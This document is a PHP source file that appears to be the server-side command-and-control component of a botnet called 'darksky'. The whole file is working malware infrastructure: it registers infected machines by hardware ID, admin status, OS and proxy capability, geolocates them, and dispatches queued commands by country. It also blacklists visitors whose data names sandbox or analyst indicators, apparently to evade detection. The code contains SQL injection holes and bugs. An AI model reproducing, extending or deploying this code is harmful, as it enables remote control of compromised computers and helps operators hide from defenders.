<?
	include_once('GeoIP.inc');
	include_once('config/config.php');
	include_once('security.php');
	
	class Bot
	{

		var $id, $keyarr, $defaults, $ip, $country, $countrycode, $hwid, $name, $os, $socks, $s4, $s5, $https, $admin, $idcommand, $result;
		
		function __construct($key){
			$sec = new Security('');
			$this->ip = $_SERVER['REMOTE_ADDR'];
			$this->defaults = strrev(base64_decode($key));
			$this->keyarr = json_decode(iconv('windows-1251', 'utf-8//IGNORE', $this->defaults), true);
		
				$this->hwid = trim($this->keyarr['hwid']);
				$this->name = $this->keyarr['UserName'];
				$this->admin = $this->keyarr['Admin'];
				$this->os = mb_substr($this->keyarr['win'], 0, -1);
				if(strlen($this->s4)>0){ $this->socks = 1; $this->keyarr['s4']; }
				if(strlen($this->s5)>0){ $this->socks = 1; $this->keyarr['s5']; }
				if(strlen($this->https)>0){ $this->socks = 1; $this->keyarr['http']; }
				if($this->os == 'u4dg64'){ $this->os = 'Win8/10x64'; }
				if($this->os == 'u4dg32'){ $this->os = 'Win8/10x32'; }
				if($this->os == 'W1nXg64'){ $this->os = 'WinXPx64'; }
				if($this->os == 'W1nXg32'){ $this->os = 'WinXPx32'; }
				if($this->os == 'W1n7g64'){ $this->os = 'Win7x64'; }
				if($this->os == 'W1n7g32'){ $this->os = 'Win7x32'; }
				if(strlen($this->keyarr['UserName'])>0){
					if(array_search('vtc', $this->keyarr, true)){ $sec->AddToBase($this->ip, 'Запрещённое имя VTC'); }
					//if($sec->MatchName($this->name)==true){ $sec->AddToBase($this->ip, 'Обнаружено закодированное имя:'.$this->keyarr['UserName'].''); }
					if(array_search('Dave', $this->keyarr, true)){ $sec->AddToBase($this->ip, 'Запрещённое имя Dave'); }
				}
				$this->id = $this->GetBotID($this->hwid);
				if(empty($this->keyarr)){ $this->result = false; $sec->AddToBase($this->ip, '[Анти-Детект] - кто-то пытался зайти без параметров'); } else { $this->result = true; }
		}
		
		public function isJson($string) {
 		   return ((is_string($string) && (is_object(json_decode($string)) || is_array(json_decode($string))))) ? true : false;
		}
		
		public function datetime()
		{
			    return date('Y-m-d H:i:s');
		}
		
		public function AddUser(){
		global $mysqli;
		$gi = geoip_open('modules/GeoIP.dat', GEOIP_STANDARD);
		$this->countrycode = strtolower(geoip_country_code_by_addr($gi, $this->ip));
        $this->country = geoip_country_name_by_addr($gi, $this->ip);
        geoip_close($gi);
			if ($this->countrycode == NULL) { $this->countrycode = 'XX'; }
			if ($this->country == NULL) { $this->country = 'Unknown'; }
			$sql_add = 'INSERT INTO darksky_users (`id`, `time`, `ip`, `hwid`, `country`, `countrycode`, `os`, `userpc`, `status`, `isadmin`, `datereg`, `installed_socks`,
			`s4`, `s5`, `https`) VALUES
			(NULL, "'.time().'", "'.$this->ip.'", "'.$this->hwid.'", "'.$this->country.'", "'.$this->countrycode.'", "'.$this->os.'",
			"'.$this->name.'", "1", "'.$this->admin.'", "'.$this->datetime().'", "'.$this->socks.'", "'.$this->s4.'", "'.$this->s5.'", "'.$this->https.'");';
			if ($this->ExistsUser($this->hwid) == false){
				$mysqli->query($sql_add);
				return true;
			} else {
				$up = 'UPDATE `darksky_users` SET time="'.time().'", ip="'.$this->ip.'", country="'.$this->country.'", countrycode="'.$this->countrycode.'",
				os="'.$this->os.'", userpc="'.$this->name.'", status="1", isadmin="'.$this->admin.'", installed_socks="'.$this->socks.'", s4="'.$this->s4.'", s5="'.$this->s5.'", https="'.$this->https.'" WHERE hwid="'.$this->hwid.'"';
				$mysqli->query($up);
				return false;
			}
			$mysqli->close();
		}
		
		public function BannedSet($id){
		global $mysqli;
		$sql = 'UPDATE `darksky_users` SET banned="1" WHRERE id = "'.$id.'" ';
		$mysqli->query($sql);
		return true;
		}
		
		public function ExistsUser($hwid){
		global $mysqli;
		$sql_check = 'SELECT * FROM `darksky_users` WHERE hwid="'.$hwid.'";';
		$res = $mysqli->query($sql_check);
			if($res->fetch_row() > 0){
				return true;
			} else {
				return false;
			}
		$mysqli->close();
		}
		
		public function GetBotID(){
		global $mysqli;
			$sql_check = 'SELECT * FROM `darksky_users` WHERE hwid="'.$this->hwid.'";';
			$res = $mysqli->query($sql_check);
			$row = $res->fetch_row();
			if($row > 0){
				return $row[0];
			} else {
				return $row[0];
			}
		$mysqli->close();
		}
		
		public function GetCMD($id){
		global $mysqli;
			$sql_check = 'SELECT * FROM `darksky_users` WHERE hwid="'.$this->hwid.'";';
			$res = $mysqli->query($sql_check);
			$row = $res->fetch_row();
			if($row > 0){
				return $row[0];
			} else {
				return $row[0];
			}
		$mysqli->close();
		}
		
		public function SelectAllCommand(){
		global $mysqli;
		$index = 0;
		$cmds= array();
		$sql = 'SELECT * FROM  `cmd` WHERE `country` IN ("al" or "'.$this->countrycode.'")';
		$result = $mysqli->query($sql);
		if (!$result) {return "Database Error [{$this->database->errno}] {$this->database->error}";}
		while ($row = $result->fetch_assoc()){
			
				if(intval($row['amount']) > intval($row['done'])){
					$cmds[$index] = $row;
				} else {
					if(intval($row['amount']) == 0):
						$cmds[$index] = $row;
					endif;
				}
			
			$index++;
		}
			return $cmds;
			$mysqli->close();
		}
		
		public function SelectOneCommands(){
		global $mysqli;
		$index = 0;
		$cmds= array();
		$sql = 'SELECT * FROM  `cmd` WHERE amount = 0';
		$result = $mysqli->query($sql);
			while ($row = $result->fetch_assoc()){
				if ($row['amount'] > $row['done']):
					$cmds[$index] = $row;
				else:
					if ($row['amount'] == '0'):
						$cmds[$index] = $row;
					endif;
				endif;
				
				$index++;
			}
		return $cmds;
		$mysqli->close();
		}
		
		public function IsMarked($idsbot, $idscmd){
		global $mysqli;
		$sql = 'SELECT * FROM last_cmd WHERE idbot ='.$idsbot.' AND idcmd ='.$idscmd.'';
		$result = $mysqli->query($sql);
			if($result->num_rows == 0){
				return false;
			} else {
				return true;
			}
		$mysqli->close();
		}
		
		public function MarkSet($idbota, $idcmda){
		global $mysqli;
		$sql = "INSERT INTO `last_cmd` (`idbot`, `idcmd`, `viewed`) VALUES ('".$idbota."', '".$idcmda."', '1')";
		$result = $mysqli->query($sql);
		return true;
		$mysqli->close();
		}
		
		public function DoneUp($id){
		global $mysqli;
		$mysqli->query('UPDATE cmd SET `done` = `done` + 1 WHERE id='.$id);
		return true;
		$mysqli->close();
		}
		
		public function UserExit(){
			session_unset();
			session_destroy();
			return true;
		}
		

	}

?>